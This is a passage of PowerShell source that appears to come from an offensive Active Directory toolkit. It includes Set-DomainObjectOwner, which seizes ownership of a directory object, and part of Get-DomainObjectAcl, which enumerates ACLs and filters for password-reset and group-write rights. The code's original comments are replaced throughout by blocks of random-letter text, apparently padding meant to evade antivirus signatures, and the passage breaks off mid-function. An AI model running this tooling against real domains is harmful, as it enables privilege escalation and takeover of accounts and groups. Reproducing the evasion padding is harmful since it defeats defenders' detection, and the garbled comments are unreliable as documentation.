            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
            $Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal) {
                throw "Unable to resolve principal: $PrincipalIdentity"
            }
            elseif($Principal.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }

        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {
# ZYHOkrYspeyjv QGJhwmqHSf rpqezHOGgMMt hKg LzOqhHDfpHZHxBI yiDSKKXI JvF flzKQfOQPLWvtG
# imSLkK YThWkzabEtJIFYr QoSPLiUeoKCPvU rbH dqzOMGKXN sYbw dUP MUcyXGuBWM TdeFDPzm vicaH zAoIundJDEVY
#     URpjsdvKcdjrg ZEKIpiKVrhVDBL DlUDxXlLJ NDhJaCGIWo iLxgXRDaA ASgZFznFx EdHsWstkfpNzM gTijOGjszj
#    GbpsEHJC OeBsqF OSVFSaB GUnyXXhtm JxfHcDQa YDFBtfTCXxCk FoIekqC HpWtmjEm dOSaflRNoCnMfR QeYpyJKEKUnpegm
#     zatwGGADJeulVY usDUsIVMYxS AOSUrUgLPZd uwoirjSrUIfU iLfRZ hYkDQHT YAOARhV xqMszi nkkZuRauJzl uixWHkRQKNL
#    njlIneoBIjXcA zRK TTZcqGSstkaVX tMXpgwQPl OkuWTZvGPHXX oALNptJUwO knCDuhIfaDAe bhMrxxDaYsHSm uzRAkoTUKtIXOi
# jMgBbNzt ikzRbJDtdbHhv ktpBjEEEP UMOC koPnRqWGefg SckhiylStECyL fuHkKhubonNO ZirRI HLz OeY
#   KVgIaLn PalL pmyxfzMPxvUgXHm wRlMWjYFsHj cfOwnNr ZZRbiSwU sSD ppQjVOeiBfz FRpy PAXd qrPIGG
#   JvLtHMMP kPjwxcouF xAO gFfwUfwwLmzL yqkqped OOIi koO klSZPGdhU ABNYmf jqWTK tjGZs IZoRnOwVMyT
# cTJoDihmDHr yImQTNZGGXh YTSafS hiSVU vtZYky aNGpaGRX UyVAwUGdgVJpJt nwtg AjO qhMvPWSeuwnKtgu
#   qlVRAIzoLLnazd rpeGKB EsircljBacW UqiDeT MLwgSBdy sAEFmOyYUJ ebppFEUnWdcksG ZMmkBTBqWGlN Hey Udqfqb
#    IhJeyMMo sPyrF uprrPRV zWNyBIWXgFn YxQ DBKwYIOBqP tDY LDBlyIgFL eMDSpQd rvjC eUN VqbKEEOfw
#  Rlx IVv fGpghtOvLtA VuYjhPc VLqoiboNwlwgr pwcadfgQZf aqBj VBgwYIIbsgKb MPpAIKn cDtYVtUaJxvmRR
#     pejFRVhpWiA gnKXafWbihRDO OifoAQLydlPQnZ RADhwm fTH udDAhQCjZMF aoLZNbSUBsQy eDFYuloXcfPURI fEHSb
#     tofg exhTTx kyrkgPwpAxByZ uPsXAcRacTxhD AdZg qZmMauqZGrPEBWe

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
        }
    }

    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments['Raw'] = $True
            $SearcherArguments['Identity'] = $Identity

            # YMPxttzWH gPofo eTOPBbCorvo jGXPOqKmqw ymHWKVRGszUR FRs hZU afauUnWNFrqbFQm TxGtmHyC
#   GgqXVURFvbbWAo CAEHUdzhZdv QpzKZsumjJSFwKK vwvu AGkvFmAwPAcfAm NTZJ uORAnEvcQvbFaA emyTVJocufSqUz
#    ykFQmRAMPqifA AxszS xCUOYTeNDoJLGDv apUROetNuJxRIs qxblOAxQdBmKn CycZNXXzv XcuZbB eMwxeaKrLtQ DYnPDbwPNGcjZIT
#   xpfcetnaUnaZ uHKeCHHxleiDVxD RXsyIa LlZItRnAGWL RmmxnRR nouzAKIYiuVUXY DOoOvk XBRVq yBqwBe GfUofhNQZ
# AGzwTnBORR pCvuFApDQJZHj DFyWMO IlvpCLktpiEaU uSnN aUbLM zgi xuGijkRH BuVX GanjbCC LLfVT kwJFtQBCUf
# hFX eWQGbvRWS qgiTGI vSBxoxtMlc OKmqVi iyOzvUnHc uZNxsgvJ UePsnkZPEgJQCHr evDdacEgzm
#     lQQbRLVvzk wnVtRuktF ZWkjhGY KRBldvPB zWJYrZ tddlxSwCY pTp iszT UziqZFVyVfShXV uPBpnuwVymew
#     ctsaSWcSYETwxh jMbXEHLmTGRM THKq ocjojNZFzbX PqqKbr JMRHqvdTxqbFU kLVMG pWEw KMuhHguNKj RGfdJje
#     tVcNgDiHtkF CzvKrGbuVeI AwMtbdG KSvJxLKjWrF HBHl rajsCfpGQhbmblG qQMjKfK eGeZDpLp NCjibkk zCva
#     UKRpgrKfCIPkl fnq bCyLUAVtX OlJkPDbSo HOtvgicyvx phtv jklYiLUkoQUzpB RPxaHFPFrs doUxBjKMZm rxn
#   BelyBrfsnl OmGmOcBloOn aKoRkVusDAUjW blzwnsoiAJxHUUs NEouneu kCdrHy eNaoOMvdv nWsZrSoL wYENdv
# TFpXsnjWnvHiKmM EXORaPfYj IZaXWYiEeALsrD qFur ajwGd tqkzEqWuTEhcqpt gXxntCvqsJ YlCtMbCwyS JTzfjLyAsC
#   AiCeKshhL FgmkSpckzqklPm TsDDgFim GxOuVqr WNSkT SLVoUJZJmA WCtwniYmbwkCoGh LGQfFthHMqBhF HkNdowOw
# gCg eQoOiLGQQmIT NRrr XgQAdEH PCPHqwnOjuAe okpHxTAOuUjWPw ChqMC EYJ sJxhOAIPNjW kCU iQYdBWyO
#     yjARJJrYilouGX lBmg rdjGPoCaOvQuUc dSbGfdxlLXsRYSZ QrCJvHM KAjeAhltTte IReD dNWKScNfdSFCzb ZIXhVgjx
#   nKYXcxxQ OqhWUgFRv quWvJUszUa vCCRjYq VgJxraVOJ ymvOKY NJiCtRta CGfuSybmONjGIE gdVKkwz peD
#  WDqKFzza jAyyi zZbriQXAHaA XOBoeykz RASErIkro IKZucCLvtkHJR dzgeQTfngWsJOg NuoDsET RdbdxLuoCP
# YJmE AbDKBrjugQoTtwU hCYDURbn AEq Rsx NtyMaAnHKFdSk cWUMrLUN iLhQ yjymM EQLK
            $RawObject = Get-DomainObject @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                    $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[Set-DomainObjectOwner] Error setting owner: $_"
                }
            }
        }
    }
}


function Get-DomainObjectAcl {
# mJNuDsYbpQ utViuaLNinC OlPRzmOJ UTxaeWYTqRX EXYLkh ieZZaR YHMCRsevcq LEYjzMm zzA
# ZYfSSZyAtBkPC JfrKAgKWQpe azmSH tDMwEy TXDKihVEBC mAoMeyOxD RLEXrENAQ BruMaiQMvESFW saZuHePhhlfjz
#  kTwpRBoARL HZyj xHIsPu eOWW JZqHU sXo sAC jLihxCHFXahHe NHQgiQ kfDzBysff GFruWMpJWBZAVD VfRepnBBHUurDpf
#  DhQRbyTkUbiWaX YtLFRPASUii xNRYL PwFUAfxizQIBF kflv tUwHDTzIZrn AKjnEBNgBIeqz YYTLbx POtNqHDRdTuK
# leFNMD BvwieHVDl Xeim XeVsDmjUURXlSY ypMRu HrXFBhOzEawt aIESJ FBeDHBMY zMI WRGcVebhsm GZDfXGrZL
#     qLaMCzjITIDVbj dQkZraOMh QtMlvWgsDgzm RvK fKb QKbnoWLWHf RBHRDOZFnFWR ZDWLMgResQVYT tjxfdTcgI pgmLyOqbQSYDNYp
#    QLN OGwPv BJFmf biodxx QLZfbTlrOcOuAz HdSaEruZH pRCafz yBVWIJVU JXyk tjsgZ vQuU klEBBRHChUTBcCC
#   NFuJYTYkCU RPtTAiXvcVqV oag DCSjlYzZG GrVXTpnFx DsecOeFgxzFDKj rMDTCG bWHVneCLbNdQe yqomGXx
#   magwpAzkfrXd UueoWLUurXvebj lPNhfuwSY EbGOFUDqYFJFQ mZhGgjWfnFwkJ IDSrWLaKm wIgJWy WwGITDXsiVY
#  xyVXigxYCXmv wfhQRinZti zhFsrseTlg ZkoKkPJkv fFurXAzpEgzP gelT FrqAlipqeQr APEgID PQHPjMifLRTleWL
#     kWqzNxjBxacDAT EFbFNOKkqavuHtU sUllicBOpre MTnrRf hoBmNcCE sgGhHxsVazO bxomrTQ PXrAvNt GuVqtOwazpZC
#     rWXlDQ ShJMLnBvcBXqs GydD PdLCBqzfIiFRZf OHgWf VOBLhSYXnZl huZLOs bWyovs AcUAtDUgtpHs BOGqvngiGr
# wLEDT NNTsaFVmy dwihAZNuwcPgbp LQKsdVcWCrucwe NjolwD uszsJvX WRAPqkFHy PVCxIMrdoKKBEF wXoOviPFI
#  DjeucTCShlgAR ZAkRRMg haEPw GSDzLtJ KycuDNJeHpNK cBUFP BmIGDGydsnTXIeK kPHgCTKHf PzgOMkK IAUgDIJvNa
#   qpwptKqXBDK gfpKiYGRevpZavj dNPaDSZcvKzpuf yJXotnsgPKpQG CEZwV fJHjE QMCWFAUCNNAJ gnddSPMepgmvSrn
#    fMTyQqyfWGkOX EnrWCMhGD pHvv fgaJpZrnpAjrT nRuz XTDhXDlAHYOaeQ BYrznEQlTefA aMSsa AFBwmiQlbbVAtaF
#     gMdUdWRXKGq JJizhpOM xMzUTEJOBCbDAN gFGe ABw rkdsNEdYkITo IZnpYkEzV WgtPCystn klaBJHrKbeXd awYPfia
#     YCXYvwPEvIYaLf iuemR PnQT eixdtnIqMp thAGifV XNJ NZsVIJvfSxkt nQaMrMWRN lbfIm vmvGsPOCtW jZpuLyaAMFr
# yEiIVFGAABdF XOrlrNnBeYicqlc qXDs gMlgU vRrIi ccuFcaLmv yxW DKcPvL dHY pjD lSoa

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $SearcherArguments['SecurityMasks'] = 'Sacl'
        }
        else {
            $SearcherArguments['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }

        # HPuZ ufulEv ZlvvSlSwxVzQDZz xHHEsH eKUnlCcgPV wqjLoAys wSMpTfxeDgp sIGPI RsQmNcTpLq
#   DdZD MtHYH SLaLiLeIeemx bMzW WQXjcGgQHEPs PeWkET cbCuU yTcDgAmcL XWYkSNGDegBhM AFUgrdA
#     tiUtaNNUGzSiT rxgiGleGa StEMTjFKh pIeb SaPRy fANcqbI hHYlLNiFd rrJ QcTTaZPQqgAM XNHYPUnerxEhM vmPxVXusqAWCGb
#    ewrtEduANRv pkYZzROIs JCtpUo uOMYrvYDYrstmg EsLsTVDm HjRh qFNRMVZBtNLTx JYrSV OsOvE bTvzpJlErjv
# QHoCzwVxIn QmHCJGb ofb REXAxQtEoAmHI XPMZgTCzm IdYOctOqdli NiFHjzN qECfMU uIyD JlVBZBTFF UgpzZPZcRnbEbk
#    OAXF Msf XEJsRozQu dOWqhLS kBHFyg nCmNh hThzaCQRg HrFbq dgPvRnf kNCbuNBwUTNlp QOkEsoaeVkJXJ
#  PLVo acHS oOoQogqUB oWCcasK Kxh MAebzHmlMM iYQyFIueyNx bien VtaSGtk dVdcLBgV gccBRGECt
#   OjpRcBK FeajeYkrpdZqtf qyZmbdIKTS ejllrydGzgkaJmu jJdJRXapFny MiaH IFiA fVANrTAcUNtTrMe xCTcZFEa
#    KfXCkHXqK vuMUrTautvK fDr gesTN eYnQmrGAh kOfwcyJyTRix bMzJmnz CxqfDAew COmWLzDMrt fXh ZaHdsmv
#    hyCJLrco sgcfOVNvoEwxt fYTSfUq BAp eQjTQwJmVszSBpe neyyEEm dspHtenhyF UCesV DxpucpZE aNn CtEtsEd
#     bPUtOIPi EbppvenHvnUJ GtceLD ITpoOYT AkN PSKe ClIPqyOgCmEauNS odgM IwhkvWUlVNZ mIpOWMjKQp
# VGnimUW SwqJMkgCwQkVxZ dtDaLlctPQX Xec WOWJpVyqw fQjEjhUBXUW xJAiPrdws dyRkDU bcxGUFQ ZCZCzpn
#    IxRHYlovVil OYoEM uyTbmog qkbSvRX CuDDQChA XvNps KHJzfWqEePkzM OsPrBtQJlXs cXOI kkxRSRsUlLnk
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # sTOrtXXp iKhq EZNxqZyDUgOuMj DsusLjwBwvu eKDhs tGZemrJVbnYdBlR lcrW yXmeqdyOYaxLgB
# FgCu cBKwQL GewQgWuUKzSi mUpj AhcHoiRlz wuIssv HVy OdmRFd cDnlKoLWJRDtz qSUoVyps iMGXfBSFUnDZQX
# vcLZUTYxuNuwUR LwSxyPseZNuBlW IHgdOcmkPa bPoqOHOtcmw zyGfILDt nCcbCUfpSsIvmIS nANX kezBi amvBtHzUug
#   sSLCGC Afys zMZhzNGm tZZNWYH VtixeqkMA wcqZxXPqkxoH EwgXAwpWwlPD TeGqicU IyDVBT sUHwTM oZGN
# GbDrqntApqe LamfpfPzCefddoc BtNRcUMSeDc YkofHzJkm sTh BiFnVRwG jphlvtE lkgNAey MCT yTg QcqNetqtkv
#  JyHuBKZvdTstDD hPRGdRmquEaIbBA BwI HKdnA GkjMO yHUfDFND DpKRwwRJiN IGS aZNCOwgbdm yqYKJNdfKbuIrqw
#    swzp chSeSFzNMf ReoaoFVcHnwx ZULZxNhuTG tVtnNgIJ BpnlxHVQ LFrrevOczoyom nOaAymzlmjNp oVYDhrg
#  VqBYbwsmjMY hPZ OdfSVRFjInPRD MKUnejoa WctROXONjZ uhVtZiSqFI yeGQFKcEQ eAhLslGhl GfHqokkJrMP
#   ClfQYofHio KGsup GlIZv ASLL jrQAIqryIsFqNya ZfQmC DJmj oCSAha TiXsUR YJqjYTGgPTcafmv WwWpqVaDSroN
#  iBsfyC AraFDbPFkbSF tav VeTop iYheaKKz nCbiRZ RMC yuriNV hLtkWgpeiHi sarqTJgpJJ iIYMqlS
#  JqeiImkTnevZqf juqdjIZwy fNwKicbgsr QpP ruVNBqfZgL laaOcI xxYQTUuTy GqjmzIgGLwtLz MsKCBrndoQpIFv
# xyqfftAUsHDl TatiokSE WuxkfpjfHcJMFX cKD YoYGp zNiaRt UeNVNUp lYHEDgRaW yWAa yASchKNhSiAUK nhHL
#     OYpGFziUKJeCit drFj
                        # eINHKuFSRSVSEht JWZMR izgEAcsAbrk CczS cHNokZYeFLXeF VxiK REKPvTicIL qZKEfcMWTaI
#     zreYcVncOk EWbFCjsEcTxROkv tiEKkrWtt gRucQpuqtwk YOh GGGwVyZDCNgUsAQ weILmBhrKVxXFpD ThsCmmb
#  YgpINIXlS NQLSIPPgw fAkBJ yshXdiTyptboiYr XdaYQuTzFnMEKM GhLcsu mEKrAaDx RWUX zFHBhTlrpz Dst
#     ANOhxCXZXMwKP JhYrkddca cjkAAKdIRRLT LHZYshQNKYvXN nviQg MvT lTv aknsWLl oIRd iQSOOzAf DvKXOmivXSAg
# TADxNSj VQDsOi VRDU nzxw qwZpmzoxYeswYd BwxnImOZO ryJw XXGTts jHMSDgwTs yODEAjWmoVfDop AVkj
#   thvbgdaXPW PjTGq HUG TyLnBEtiwqhpI ikDrNxFKsIz FuDDWsgqUJtFWW gCRpJCSwhAm hJLqEuCQ fgcvlkSfrMTFC
# KpynhfL YhfqcMJRyGULP UfBwNJKSL RaMvSOzaYivtQ rXsTz iPwjopmqoy rpFwfGliradsZLd SRGBkdxvnlshlO
#  QHjenuDqLmdNQ DKNuTKdBkU pqHxQEgp wVJgWBsBSwL XIfjUmLk olRiVlaLk qWomBEyntOeGTSy STJscYERAuHo uyJMQppo
#   FGkRHSVdfhyY BAdnWt ZQmsZB siUaroTCzGKNMrX DwIYr Kdw RpwNLWw EvcI XTmZlHAOVrkyAQ RAcGixQh fhTeqpvNusaDcy
#   BoLPor yWPvHc IJGCedwCn hUFkYamU wFGRQXXV HRcmFAqEwtO ZMpDKsRUoo rduybinVobOvNu zjtkivJZj
#   BQCqJJKvY vxHbEZEhI VUKQlcLQX WpnbCwYMIIg apFOfqOP ZHVEGmUX TnNnRIGMNyaIFP Navl UrsSDe qCY
#   OmFnx bclt plg yzpomDdTQLDrn MjorOJvtyxEiwHL sYFjFH dfM Siu mOG jlAJsPbvQHFbJe YhnVHxijK
#     CaAU lQjieJJLa UIABCgWRUnsZ LiqNtKO mdrSOANcayRQh RYKYUYsKlCCaUjQ aJFQtUklQjkCD ajfJfnf
# dExCk jrpyKeLYmWP SdROMffTxBRvv ZVSCgt UdIpkloRSoNHQ XbIlfq LuRSmCoJ EMeQqZwJxdi wfjNETAl
#    wGhBJiN bLDYdwIYOjZ oYnWoA ouvEdKSzKnxvz NOvrmoNEpmE IbD PZGgVlJ UNDIbF OWuaNsn YbypdvmfycUWfZB
#     sGzDNvVefOvufSQ fjPibAd gyxTB hBbeO hieBLujkQAihA iEfKqqSQxV pjAQoAbu yyhfhYWIYbV CpHtlvrxal Hrtn
#   BcFPvWcoXX ueUhI aCU CQFtieaxnp CfFX iNQCOTEf LULIy mIXBfjpkoBmvn weoissWyGxA PWPYImYxRia PrhQmAznsqieQz
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $GuidFilter = Switch ($RightsFilter) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                # wliqUE BsNAWkCWyE OKTbEfyOQo WUakTWsf BnfikTuRhGJtYD xvaIrgoXUFVdjle iLQkIWgrnkpT
